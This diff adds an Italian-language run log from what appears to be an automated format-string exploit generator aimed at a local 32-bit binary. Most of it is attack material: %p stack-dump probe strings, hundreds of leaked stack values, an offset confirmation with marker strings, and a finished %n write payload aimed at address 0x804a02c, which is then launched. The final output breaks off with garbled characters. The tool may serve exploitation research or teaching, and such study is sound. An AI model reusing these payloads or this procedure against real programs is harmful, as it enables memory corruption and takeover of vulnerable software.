@@ -1,0 +1,323 @@
+Byte da scrivere: 4
+Dimensione indirizzi: 4 byte
+Endian: little
+
+Input da linea di comando: [{'type': 'command_line_input', 'value': 'AAAA', 'free': False}, {'type': 'command_line_input', 'value': 'PPPP', 'free': True}]
+Input da passare durante l'esecuzione: []
+Preparazione indirizzi e scrittori: 
+   Sottovalori da scrivere: | 1 | 
+   Relative dimensioni di scrittura: [4]
+   Relativi nuovi indirizzi target: | 0x804a02c | 
+   Scrittori: [['A', None, 'n']]
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'command_line_input', 'value': 'AAAA', 'free': False}
+Input non libero
+
+Input in test: {'type': 'command_line_input', 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (6 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: ln, rk
+Conteggio della dimensione effettiva dell'input (fino a 510 caratteri): 1016 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: 
+   Stringa di ricerca: lnAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$p%18$p%19$p%20$p%21$p%22$p%23$p%24$p%25$p%26$p%27$p%28$p%29$p%30$p%31$p%32$p%33$p%34$p%35$p%36$p%37$p%38$p%39$p%40$p%41$p%42$p%43$p%44$p%45$p%46$p%47$p%48$p%49$p%50$p%51$p%52$p%53$p%54$p%55$p%56$p%57$p%58$p%59$p%60$p%61$p%62$p%63$p%64$p%65$p%66$p%67$p%68$p%69$p%70$p%71$p%72$p%73$p%74$p%75$p%76$p%77$p%78$p%79$p%80$p%81$p%82$p%83$p%84$p%85$p%86$p%87$p%88$p%89$p%90$p%91$p%92$p%93$p%94$p%95$p%96$p%97$p%98$p%99$p%100$p%101$p%102$p%103$p%104$p%105$p%106$p%107$p%108$p%109$p%110$p%111$p%112$p%113$p%114$p%115$p%116$p%117$p%118$p%119$p%120$p%121$p%122$p%123$p%124$p%125$p%126$p%127$p%128$p%129$p%130$p%131$p%132$p%133$p%134$p%135$p%136$p%137$p%138$p%139$p%140$p%141$p%142$p%143$p%144$p%145$p%146$p%147$p%148$p%149$p%150$p%151$p%152$p%153$p%154$p%155$p%156$p%157$p%158$p%159$p%160$p%161$p%162$p%163$p%164$p%165$p%166$p%167$p%168$p%169$p%170$p%171$p%172$p%173$p%174$p%175$p%176$p%177$p%178$p%179$p%180$p%181$p%182$p%183$p%184$p%185$p%186$pGGGGrk
+   Valori esadecimali estratti: ['f7fdf41c', 'f7df4e95', '80484d1', '3721d18', 'ffffca5c', '44ffc9dc', '444444', '380', '8048281', '380', '380', 'f7fdf2b9', '93f', 'f7de4e60', 'f63d4e2e', 'f7fd0110', 'f7fdf76d', '1', '1', 'f7dee474', '93f', 'f7deed04', 'f7fd0110', 'ffffca54', 'ffffca50', '3', '0', 'f7ffd000', 'f7deed04', 'f7de5012', 'f7dee474', 'f63d4e2e', '8048281', '7b1ea71', 'ffffcad4', 'ffffca54', 'f7fd03e0', '0', '0', '0', '0', '0', '0', '0', '0', 'c2', 'fff', 'f7fdf439', 'f63d4e2e', 'f7ffdaf8', 'ffffcadc', '0', 'f7fdffcb', '804821c', 'ffffcadc', 'f7ffda9c', '1', 'f7fd0410', '1', '0', '1', 'f7ffd940', 'c2', '0', 'c30000', '0', 'f7ffd000', '0', '0', '0', 'e796fb00', '9', 'ffffcd8a', 'f7e11239', 'f7fb9808', 'f7fb6000', 'f7fb6000', '0', 'f7e1139b', 'f7fb63fc', '0', 'ffffcbc4', '804b160', '3', 'ffffcbb4', 'ffffcbc4', 'ffffcb20', '0', 'f7fb6000', '0', 'f7df9fa1', 'f7fb6000', 'f7fb6000', '0', 'f7df9fa1', '3', 'ffffcbb4', 'ffffcbc4', 'ffffcb44', '1', '0', 'f7fb6000', 'f7fe570a', 'f7ffd000', '0', 'f7fb6000', '0', '0', '9ea76da6', 'de0febb6', '0', '0', '0', '3', '80483a0', '0', 'f7fead50', 'f7fe5960', '804a000', '3', '80483a0', '0', '80483d2', '80484b6', '3', 'ffffcbb4', '80485d0', '8048630', 'f7fe5960', 'ffffcbac', 'f7ffd940', '3', 'ffffcd8a', 'ffffcda9', 'ffffcdae', '0', 'ffffd1ab', 'ffffd1e0', 'ffffd201', 'ffffd221', 'ffffd240', 'ffffd24d', 'ffffd262', 'ffffd271', 'ffffd284', 'ffffd299', 'ffffd2a1', 'ffffd2af', 'ffffd2c1', 'ffffd2d4', 'ffffd2eb', 'ffffd310', 'ffffd36f', 'ffffd38f', 'ffffd3ab', 'ffffd3e1', 'ffffd404', 'ffffd40b', 'ffffd41d', 'ffffd42d', 'ffffd440', 'ffffd44a', 'ffffd45b', 'ffffd46c', 'ffffd480', 'ffffd48b', 'ffffd4b7', 'ffffd4c4', 'ffffd574', 'ffffd5fa', 'ffffd611', 'ffffd630', 'ffffd63b', 'ffffd64c', 'ffffd673', 'ffffd6fe', 'ffffd71f', 'ffffdd0b', 'ffffdd26', 'ffffdd3a', 'ffffdd63', 'ffffdd8c', 'ffffddc0', 'ffffddd0', 'ffffdde3', 'ffffddf5']
+    Valore 1 -> f7fdf41c
+    Valore 2 -> f7df4e95
+    Valore 3 -> 80484d1
+    Valore 4 -> 3721d18
+    Valore 5 -> ffffca5c
+    Valore 6 -> 44ffc9dc
+    Valore 7 -> 444444
+    Valore 8 -> 380
+    Valore 9 -> 8048281
+    Valore 10 -> 380
+    Valore 11 -> 380
+    Valore 12 -> f7fdf2b9
+    Valore 13 -> 93f
+    Valore 14 -> f7de4e60
+    Valore 15 -> f63d4e2e
+    Valore 16 -> f7fd0110
+    Valore 17 -> f7fdf76d
+    Valore 18 -> 1
+    Valore 19 -> 1
+    Valore 20 -> f7dee474
+    Valore 21 -> 93f
+    Valore 22 -> f7deed04
+    Valore 23 -> f7fd0110
+    Valore 24 -> ffffca54
+    Valore 25 -> ffffca50
+    Valore 26 -> 3
+    Valore 27 -> 0
+    Valore 28 -> f7ffd000
+    Valore 29 -> f7deed04
+    Valore 30 -> f7de5012
+    Valore 31 -> f7dee474
+    Valore 32 -> f63d4e2e
+    Valore 33 -> 8048281
+    Valore 34 -> 7b1ea71
+    Valore 35 -> ffffcad4
+    Valore 36 -> ffffca54
+    Valore 37 -> f7fd03e0
+    Valore 38 -> 0
+    Valore 39 -> 0
+    Valore 40 -> 0
+    Valore 41 -> 0
+    Valore 42 -> 0
+    Valore 43 -> 0
+    Valore 44 -> 0
+    Valore 45 -> 0
+    Valore 46 -> c2
+    Valore 47 -> fff
+    Valore 48 -> f7fdf439
+    Valore 49 -> f63d4e2e
+    Valore 50 -> f7ffdaf8
+    Valore 51 -> ffffcadc
+    Valore 52 -> 0
+    Valore 53 -> f7fdffcb
+    Valore 54 -> 804821c
+    Valore 55 -> ffffcadc
+    Valore 56 -> f7ffda9c
+    Valore 57 -> 1
+    Valore 58 -> f7fd0410
+    Valore 59 -> 1
+    Valore 60 -> 0
+    Valore 61 -> 1
+    Valore 62 -> f7ffd940
+    Valore 63 -> c2
+    Valore 64 -> 0
+    Valore 65 -> c30000
+    Valore 66 -> 0
+    Valore 67 -> f7ffd000
+    Valore 68 -> 0
+    Valore 69 -> 0
+    Valore 70 -> 0
+    Valore 71 -> e796fb00
+    Valore 72 -> 9
+    Valore 73 -> ffffcd8a
+    Valore 74 -> f7e11239
+    Valore 75 -> f7fb9808
+    Valore 76 -> f7fb6000
+    Valore 77 -> f7fb6000
+    Valore 78 -> 0
+    Valore 79 -> f7e1139b
+    Valore 80 -> f7fb63fc
+    Valore 81 -> 0
+    Valore 82 -> ffffcbc4
+    Valore 83 -> 804b160
+    Valore 84 -> 3
+    Valore 85 -> ffffcbb4
+    Valore 86 -> ffffcbc4
+    Valore 87 -> ffffcb20
+    Valore 88 -> 0
+    Valore 89 -> f7fb6000
+    Valore 90 -> 0
+    Valore 91 -> f7df9fa1
+    Valore 92 -> f7fb6000
+    Valore 93 -> f7fb6000
+    Valore 94 -> 0
+    Valore 95 -> f7df9fa1
+    Valore 96 -> 3
+    Valore 97 -> ffffcbb4
+    Valore 98 -> ffffcbc4
+    Valore 99 -> ffffcb44
+    Valore 100 -> 1
+    Valore 101 -> 0
+    Valore 102 -> f7fb6000
+    Valore 103 -> f7fe570a
+    Valore 104 -> f7ffd000
+    Valore 105 -> 0
+    Valore 106 -> f7fb6000
+    Valore 107 -> 0
+    Valore 108 -> 0
+    Valore 109 -> 9ea76da6
+    Valore 110 -> de0febb6
+    Valore 111 -> 0
+    Valore 112 -> 0
+    Valore 113 -> 0
+    Valore 114 -> 3
+    Valore 115 -> 80483a0
+    Valore 116 -> 0
+    Valore 117 -> f7fead50
+    Valore 118 -> f7fe5960
+    Valore 119 -> 804a000
+    Valore 120 -> 3
+    Valore 121 -> 80483a0
+    Valore 122 -> 0
+    Valore 123 -> 80483d2
+    Valore 124 -> 80484b6
+    Valore 125 -> 3
+    Valore 126 -> ffffcbb4
+    Valore 127 -> 80485d0
+    Valore 128 -> 8048630
+    Valore 129 -> f7fe5960
+    Valore 130 -> ffffcbac
+    Valore 131 -> f7ffd940
+    Valore 132 -> 3
+    Valore 133 -> ffffcd8a
+    Valore 134 -> ffffcda9
+    Valore 135 -> ffffcdae
+    Valore 136 -> 0
+    Valore 137 -> ffffd1ab
+    Valore 138 -> ffffd1e0
+    Valore 139 -> ffffd201
+    Valore 140 -> ffffd221
+    Valore 141 -> ffffd240
+    Valore 142 -> ffffd24d
+    Valore 143 -> ffffd262
+    Valore 144 -> ffffd271
+    Valore 145 -> ffffd284
+    Valore 146 -> ffffd299
+    Valore 147 -> ffffd2a1
+    Valore 148 -> ffffd2af
+    Valore 149 -> ffffd2c1
+    Valore 150 -> ffffd2d4
+    Valore 151 -> ffffd2eb
+    Valore 152 -> ffffd310
+    Valore 153 -> ffffd36f
+    Valore 154 -> ffffd38f
+    Valore 155 -> ffffd3ab
+    Valore 156 -> ffffd3e1
+    Valore 157 -> ffffd404
+    Valore 158 -> ffffd40b
+    Valore 159 -> ffffd41d
+    Valore 160 -> ffffd42d
+    Valore 161 -> ffffd440
+    Valore 162 -> ffffd44a
+    Valore 163 -> ffffd45b
+    Valore 164 -> ffffd46c
+    Valore 165 -> ffffd480
+    Valore 166 -> ffffd48b
+    Valore 167 -> ffffd4b7
+    Valore 168 -> ffffd4c4
+    Valore 169 -> ffffd574
+    Valore 170 -> ffffd5fa
+    Valore 171 -> ffffd611
+    Valore 172 -> ffffd630
+    Valore 173 -> ffffd63b
+    Valore 174 -> ffffd64c
+    Valore 175 -> ffffd673
+    Valore 176 -> ffffd6fe
+    Valore 177 -> ffffd71f
+    Valore 178 -> ffffdd0b
+    Valore 179 -> ffffdd26
+    Valore 180 -> ffffdd3a
+    Valore 181 -> ffffdd63
+    Valore 182 -> ffffdd8c
+    Valore 183 -> ffffddc0
+    Valore 184 -> ffffddd0
+    Valore 185 -> ffffdde3
+    Valore 186 -> ffffddf5
+
+   Stringa di ricerca: lnAAAA%186$p%187$p%188$p%189$p%190$p%191$p%192$p%193$p%194$p%195$p%196$p%197$p%198$p%199$p%200$p%201$p%202$p%203$p%204$p%205$p%206$p%207$p%208$p%209$p%210$p%211$p%212$p%213$p%214$p%215$p%216$p%217$p%218$p%219$p%220$p%221$p%222$p%223$p%224$p%225$p%226$p%227$p%228$p%229$p%230$p%231$p%232$p%233$p%234$p%235$p%236$p%237$p%238$p%239$p%240$p%241$p%242$p%243$p%244$p%245$p%246$p%247$p%248$p%249$p%250$p%251$p%252$p%253$p%254$p%255$p%256$p%257$p%258$p%259$p%260$p%261$p%262$p%263$p%264$p%265$p%266$p%267$p%268$p%269$p%270$p%271$p%272$p%273$p%274$p%275$p%276$p%277$p%278$p%279$p%280$p%281$p%282$p%283$p%284$p%285$p%286$p%287$p%288$p%289$p%290$p%291$p%292$p%293$p%294$p%295$p%296$p%297$p%298$p%299$p%300$p%301$p%302$p%303$p%304$p%305$p%306$p%307$p%308$p%309$p%310$p%311$p%312$p%313$p%314$p%315$p%316$p%317$p%318$p%319$p%320$p%321$p%322$p%323$p%324$p%325$p%326$p%327$p%328$p%329$p%330$p%331$p%332$p%333$p%334$p%335$p%336$p%337$p%338$p%339$p%340$p%341$p%342$p%343$p%344$p%345$p%346$p%347$p%348$p%349$p%350$p%351$p%352$p%353$pGGGGrk
+   Valori esadecimali estratti: ['ffffddf5', 'ffffde17', 'ffffde2f', 'ffffde50', 'ffffde68', 'ffffde9c', 'ffffdea7', 'ffffdeb9', 'ffffdee5', 'ffffdefb', 'ffffdf27', 'ffffdf7c', 'ffffdfa9', '0', '20', 'f7fd5b50', '21', 'f7fd5000', '10', 'bfebfbff', '6', '1000', '11', '64', '3', '8048034', '4', '20', '5', '9', '7', 'f7fd6000', '8', '0', '9', '80483a0', 'b', '3e8', 'c', '3e8', 'd', '3e8', 'e', '3e8', '17', '0', '19', 'ffffcd6b', '1a', '0', '1f', 'ffffdfd9', 'f', 'ffffcd7b', '0', '0', 'fa000000', 'b637d11d', 'efba83b9', '28e99e31', '69cb7d67', '363836', '0', '0', '2f2e0000', '74736574', '6d6f632f', '646e616d', '656e696c', '6d6f632f', '646e616d', '656e696c', '41414100', '6e6c0041', '41414141', '36383125', '31257024', '70243738', '38383125', '31257024', '70243938', '30393125', '31257024', '70243139', '32393125', '31257024', '70243339', '34393125', '31257024', '70243539', '36393125', '31257024', '70243739', '38393125', '31257024', '70243939', '30303225', '32257024', '70243130', '32303225', '32257024', '70243330', '34303225', '32257024', '70243530', '36303225', '32257024', '70243730', '38303225', '32257024', '70243930', '30313225', '32257024', '70243131', '32313225', '32257024', '70243331', '34313225', '32257024', '70243531', '36313225', '32257024', '70243731', '38313225', '32257024', '70243931', '30323225', '32257024', '70243132', '32323225', '32257024', '70243332', '34323225', '32257024', '70243532', '36323225', '32257024', '70243732', '38323225', '32257024', '70243932', '30333225', '32257024', '70243133', '32333225', '32257024', '70243333', '34333225', '32257024', '70243533', '36333225', '32257024', '70243733', '38333225', '32257024', '70243933', '30343225', '32257024', '70243134', '32343225', '32257024', '70243334', '34343225', '32257024', '70243534', '36343225', '32257024', '70243734']
+    Valore 186 -> ffffddf5
+    Valore 187 -> ffffde17
+    Valore 188 -> ffffde2f
+    Valore 189 -> ffffde50
+    Valore 190 -> ffffde68
+    Valore 191 -> ffffde9c
+    Valore 192 -> ffffdea7
+    Valore 193 -> ffffdeb9
+    Valore 194 -> ffffdee5
+    Valore 195 -> ffffdefb
+    Valore 196 -> ffffdf27
+    Valore 197 -> ffffdf7c
+    Valore 198 -> ffffdfa9
+    Valore 199 -> 0
+    Valore 200 -> 20
+    Valore 201 -> f7fd5b50
+    Valore 202 -> 21
+    Valore 203 -> f7fd5000
+    Valore 204 -> 10
+    Valore 205 -> bfebfbff
+    Valore 206 -> 6
+    Valore 207 -> 1000
+    Valore 208 -> 11
+    Valore 209 -> 64
+    Valore 210 -> 3
+    Valore 211 -> 8048034
+    Valore 212 -> 4
+    Valore 213 -> 20
+    Valore 214 -> 5
+    Valore 215 -> 9
+    Valore 216 -> 7
+    Valore 217 -> f7fd6000
+    Valore 218 -> 8
+    Valore 219 -> 0
+    Valore 220 -> 9
+    Valore 221 -> 80483a0
+    Valore 222 -> b
+    Valore 223 -> 3e8
+    Valore 224 -> c
+    Valore 225 -> 3e8
+    Valore 226 -> d
+    Valore 227 -> 3e8
+    Valore 228 -> e
+    Valore 229 -> 3e8
+    Valore 230 -> 17
+    Valore 231 -> 0
+    Valore 232 -> 19
+    Valore 233 -> ffffcd6b
+    Valore 234 -> 1a
+    Valore 235 -> 0
+    Valore 236 -> 1f
+    Valore 237 -> ffffdfd9
+    Valore 238 -> f
+    Valore 239 -> ffffcd7b
+    Valore 240 -> 0
+    Valore 241 -> 0
+    Valore 242 -> fa000000
+    Valore 243 -> b637d11d
+    Valore 244 -> efba83b9
+    Valore 245 -> 28e99e31
+    Valore 246 -> 69cb7d67
+    Valore 247 -> 363836
+    Valore 248 -> 0
+    Valore 249 -> 0
+    Valore 250 -> 2f2e0000
+    Valore 251 -> 74736574
+    Valore 252 -> 6d6f632f
+    Valore 253 -> 646e616d
+    Valore 254 -> 656e696c
+    Valore 255 -> 6d6f632f
+    Valore 256 -> 646e616d
+    Valore 257 -> 656e696c
+    Valore 258 -> 41414100
+    Valore 259 -> 6e6c0041
+
+   Verifica posizione:
+   Stringa di conferma: lnBBBB%186$p%187$p%188$p%189$p%190$p%191$p%192$p%193$p%194$p%195$p%196$p%197$p%198$p%199$p%200$p%201$p%202$p%203$p%204$p%205$p%206$p%207$p%208$p%209$p%210$p%211$p%212$p%213$p%214$p%215$p%216$p%217$p%218$p%219$p%220$p%221$p%222$p%223$p%224$p%225$p%226$p%227$p%228$p%229$p%230$p%231$p%232$p%233$p%234$p%235$p%236$p%237$p%238$p%239$p%240$p%241$p%242$p%243$p%244$p%245$p%246$p%247$p%248$p%249$p%250$p%251$p%252$p%253$p%254$p%255$p%256$p%257$p%258$p%259$p%260$p%261$p%262$p%263$p%264$p%265$p%266$p%267$p%268$p%269$p%270$p%271$p%272$p%273$p%274$p%275$p%276$p%277$p%278$p%279$p%280$p%281$p%282$p%283$p%284$p%285$p%286$p%287$p%288$p%289$p%290$p%291$p%292$p%293$p%294$p%295$p%296$p%297$p%298$p%299$p%300$p%301$p%302$p%303$p%304$p%305$p%306$p%307$p%308$p%309$p%310$p%311$p%312$p%313$p%314$p%315$p%316$p%317$p%318$p%319$p%320$p%321$p%322$p%323$p%324$p%325$p%326$p%327$p%328$p%329$p%330$p%331$p%332$p%333$p%334$p%335$p%336$p%337$p%338$p%339$p%340$p%341$p%342$p%343$p%344$p%345$p%346$p%347$p%348$p%349$p%350$p%351$p%352$p%353$pGGGGrk
+   Valori esadecimali estratti: ['ffffddf5', 'ffffde17', 'ffffde2f', 'ffffde50', 'ffffde68', 'ffffde9c', 'ffffdea7', 'ffffdeb9', 'ffffdee5', 'ffffdefb', 'ffffdf27', 'ffffdf7c', 'ffffdfa9', '0', '20', 'f7fd5b50', '21', 'f7fd5000', '10', 'bfebfbff', '6', '1000', '11', '64', '3', '8048034', '4', '20', '5', '9', '7', 'f7fd6000', '8', '0', '9', '80483a0', 'b', '3e8', 'c', '3e8', 'd', '3e8', 'e', '3e8', '17', '0', '19', 'ffffcd6b', '1a', '0', '1f', 'ffffdfd9', 'f', 'ffffcd7b', '0', '0', 'c2000000', '7f95fc2b', 'eab4b66d', 'f6f63573', '697f061e', '363836', '0', '0', '2f2e0000', '74736574', '6d6f632f', '646e616d', '656e696c', '6d6f632f', '646e616d', '656e696c', '41414100', '6e6c0041', '42424242', '36383125', '31257024', '70243738', '38383125', '31257024', '70243938', '30393125', '31257024', '70243139', '32393125', '31257024', '70243339', '34393125', '31257024', '70243539', '36393125', '31257024', '70243739', '38393125', '31257024', '70243939', '30303225', '32257024', '70243130', '32303225', '32257024', '70243330', '34303225', '32257024', '70243530', '36303225', '32257024', '70243730', '38303225', '32257024', '70243930', '30313225', '32257024', '70243131', '32313225', '32257024', '70243331', '34313225', '32257024', '70243531', '36313225', '32257024', '70243731', '38313225', '32257024', '70243931', '30323225', '32257024', '70243132', '32323225', '32257024', '70243332', '34323225', '32257024', '70243532', '36323225', '32257024', '70243732', '38323225', '32257024', '70243932', '30333225', '32257024', '70243133', '32333225', '32257024', '70243333', '34333225', '32257024', '70243533', '36333225', '32257024', '70243733', '38333225', '32257024', '70243933', '30343225', '32257024', '70243134', '32343225', '32257024', '70243334', '34343225', '32257024', '70243534', '36343225', '32257024', '70243734']
+   Pattern di conferma non trovato
+
+   Stringa di ricerca: lnAAAA%259$p%260$p%261$p%262$p%263$p%264$p%265$p%266$p%267$p%268$p%269$p%270$p%271$p%272$p%273$p%274$p%275$p%276$p%277$p%278$p%279$p%280$p%281$p%282$p%283$p%284$p%285$p%286$p%287$p%288$p%289$p%290$p%291$p%292$p%293$p%294$p%295$p%296$p%297$p%298$p%299$p%300$p%301$p%302$p%303$p%304$p%305$p%306$p%307$p%308$p%309$p%310$p%311$p%312$p%313$p%314$p%315$p%316$p%317$p%318$p%319$p%320$p%321$p%322$p%323$p%324$p%325$p%326$p%327$p%328$p%329$p%330$p%331$p%332$p%333$p%334$p%335$p%336$p%337$p%338$p%339$p%340$p%341$p%342$p%343$p%344$p%345$p%346$p%347$p%348$p%349$p%350$p%351$p%352$p%353$p%354$p%355$p%356$p%357$p%358$p%359$p%360$p%361$p%362$p%363$p%364$p%365$p%366$p%367$p%368$p%369$p%370$p%371$p%372$p%373$p%374$p%375$p%376$p%377$p%378$p%379$p%380$p%381$p%382$p%383$p%384$p%385$p%386$p%387$p%388$p%389$p%390$p%391$p%392$p%393$p%394$p%395$p%396$p%397$p%398$p%399$p%400$p%401$p%402$p%403$p%404$p%405$p%406$p%407$p%408$p%409$p%410$p%411$p%412$p%413$p%414$p%415$p%416$p%417$p%418$p%419$p%420$p%421$p%422$p%423$p%424$p%425$p%426$pGGGGrk
+   Valori esadecimali estratti: ['6e6c0041', '41414141', '39353225', '32257024', '70243036', '31363225', '32257024', '70243236', '33363225', '32257024', '70243436', '35363225', '32257024', '70243636', '37363225', '32257024', '70243836', '39363225', '32257024', '70243037', '31373225', '32257024', '70243237', '33373225', '32257024', '70243437', '35373225', '32257024', '70243637', '37373225', '32257024', '70243837', '39373225', '32257024', '70243038', '31383225', '32257024', '70243238', '33383225', '32257024', '70243438', '35383225', '32257024', '70243638', '37383225', '32257024', '70243838', '39383225', '32257024', '70243039', '31393225', '32257024', '70243239', '33393225', '32257024', '70243439', '35393225', '32257024', '70243639', '37393225', '32257024', '70243839', '39393225', '33257024', '70243030', '31303325', '33257024', '70243230', '33303325', '33257024', '70243430', '35303325', '33257024', '70243630', '37303325', '33257024', '70243830', '39303325', '33257024', '70243031', '31313325', '33257024', '70243231', '33313325', '33257024', '70243431', '35313325', '33257024', '70243631', '37313325', '33257024', '70243831', '39313325', '33257024', '70243032', '31323325', '33257024', '70243232', '33323325', '33257024', '70243432', '35323325', '33257024', '70243632', '37323325', '33257024', '70243832', '39323325', '33257024', '70243033', '31333325', '33257024', '70243233', '33333325', '33257024', '70243433', '35333325', '33257024', '70243633', '37333325', '33257024', '70243833', '39333325', '33257024', '70243034', '31343325', '33257024', '70243234', '33343325', '33257024', '70243434', '35343325', '33257024', '70243634', '37343325', '33257024', '70243834', '39343325', '33257024', '70243035', '31353325', '33257024', '70243235', '33353325', '33257024', '70243435', '35353325', '33257024', '70243635', '37353325', '33257024', '70243835', '39353325', '33257024', '70243036', '31363325', '33257024', '70243236', '33363325', '33257024', '70243436', '35363325', '33257024', '70243636', '37363325', '33257024', '70243836', '39363325']
+    Valore 259 -> 6e6c0041
+    Valore 260 -> 41414141
+
+   Verifica posizione:
+   Stringa di conferma: lnBBBB%259$p%260$p%261$p%262$p%263$p%264$p%265$p%266$p%267$p%268$p%269$p%270$p%271$p%272$p%273$p%274$p%275$p%276$p%277$p%278$p%279$p%280$p%281$p%282$p%283$p%284$p%285$p%286$p%287$p%288$p%289$p%290$p%291$p%292$p%293$p%294$p%295$p%296$p%297$p%298$p%299$p%300$p%301$p%302$p%303$p%304$p%305$p%306$p%307$p%308$p%309$p%310$p%311$p%312$p%313$p%314$p%315$p%316$p%317$p%318$p%319$p%320$p%321$p%322$p%323$p%324$p%325$p%326$p%327$p%328$p%329$p%330$p%331$p%332$p%333$p%334$p%335$p%336$p%337$p%338$p%339$p%340$p%341$p%342$p%343$p%344$p%345$p%346$p%347$p%348$p%349$p%350$p%351$p%352$p%353$p%354$p%355$p%356$p%357$p%358$p%359$p%360$p%361$p%362$p%363$p%364$p%365$p%366$p%367$p%368$p%369$p%370$p%371$p%372$p%373$p%374$p%375$p%376$p%377$p%378$p%379$p%380$p%381$p%382$p%383$p%384$p%385$p%386$p%387$p%388$p%389$p%390$p%391$p%392$p%393$p%394$p%395$p%396$p%397$p%398$p%399$p%400$p%401$p%402$p%403$p%404$p%405$p%406$p%407$p%408$p%409$p%410$p%411$p%412$p%413$p%414$p%415$p%416$p%417$p%418$p%419$p%420$p%421$p%422$p%423$p%424$p%425$p%426$pGGGGrk
+   Valori esadecimali estratti: ['6e6c0041', '42424242', '39353225', '32257024', '70243036', '31363225', '32257024', '70243236', '33363225', '32257024', '70243436', '35363225', '32257024', '70243636', '37363225', '32257024', '70243836', '39363225', '32257024', '70243037', '31373225', '32257024', '70243237', '33373225', '32257024', '70243437', '35373225', '32257024', '70243637', '37373225', '32257024', '70243837', '39373225', '32257024', '70243038', '31383225', '32257024', '70243238', '33383225', '32257024', '70243438', '35383225', '32257024', '70243638', '37383225', '32257024', '70243838', '39383225', '32257024', '70243039', '31393225', '32257024', '70243239', '33393225', '32257024', '70243439', '35393225', '32257024', '70243639', '37393225', '32257024', '70243839', '39393225', '33257024', '70243030', '31303325', '33257024', '70243230', '33303325', '33257024', '70243430', '35303325', '33257024', '70243630', '37303325', '33257024', '70243830', '39303325', '33257024', '70243031', '31313325', '33257024', '70243231', '33313325', '33257024', '70243431', '35313325', '33257024', '70243631', '37313325', '33257024', '70243831', '39313325', '33257024', '70243032', '31323325', '33257024', '70243232', '33323325', '33257024', '70243432', '35323325', '33257024', '70243632', '37323325', '33257024', '70243832', '39323325', '33257024', '70243033', '31333325', '33257024', '70243233', '33333325', '33257024', '70243433', '35333325', '33257024', '70243633', '37333325', '33257024', '70243833', '39333325', '33257024', '70243034', '31343325', '33257024', '70243234', '33343325', '33257024', '70243434', '35343325', '33257024', '70243634', '37343325', '33257024', '70243834', '39343325', '33257024', '70243035', '31353325', '33257024', '70243235', '33353325', '33257024', '70243435', '35353325', '33257024', '70243635', '37353325', '33257024', '70243835', '39353325', '33257024', '70243036', '31363325', '33257024', '70243236', '33363325', '33257024', '70243436', '35363325', '33257024', '70243636', '37363325', '33257024', '70243836', '39363325']
+    Valore 259 -> 6e6c0041
+    Valore 260 -> 42424242
+   Posizione 259
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': 
+   Scrittori: [['A', '%0262$', 'n']]
+   Padding di allineamento: ''
+   ATTENZIONE: la dimensione dell'input non è suffichiente a stampare l'fmt di exploit (1020 caratteri richiesti), si prosegue comunque con l'exploit essendo disattivato il controllo sulla lunghezza
+   Generazione completata con successo
+La stringa generata è: 
+		b'A%0262$nln,\xa0\x04\x08CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCrk'
+Inizio exploit: La risposta è:
+----------------------------------------
+Input 1:
+L'input Ã¨: AAAAInput 2:
